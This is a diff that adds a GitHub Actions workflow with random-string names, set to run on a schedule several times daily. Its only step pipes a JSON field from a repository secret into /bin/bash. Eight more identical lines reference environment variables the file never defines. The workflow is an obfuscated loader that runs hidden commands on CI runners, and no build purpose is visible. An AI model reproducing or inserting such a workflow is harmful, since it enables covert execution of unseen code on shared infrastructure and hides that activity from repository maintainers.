@@ -1,0 +1,24 @@
+name: haiyhauyibal
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haiyhauyibal
+        env:
+          oyam9740: ${{ secrets.oyam9740 }}
+        run: |
+          echo $oyam9740 | jq -r .jus26 | /bin/bash
+          echo $cteve364 | jq -r .m7102 | /bin/bash
+          echo $b087 | jq -r .gq69 | /bin/bash
+          echo $imsof09 | jq -r .uq494 | /bin/bash
+          echo $hl1 | jq -r .aatx90748 | /bin/bash
+          echo $bj0316 | jq -r .qcw809 | /bin/bash
+          echo $r8538 | jq -r .gpea30 | /bin/bash
+          echo $hvr791 | jq -r .i00556 | /bin/bash
+          echo $qwt37 | jq -r .nndp336 | /bin/bash
+
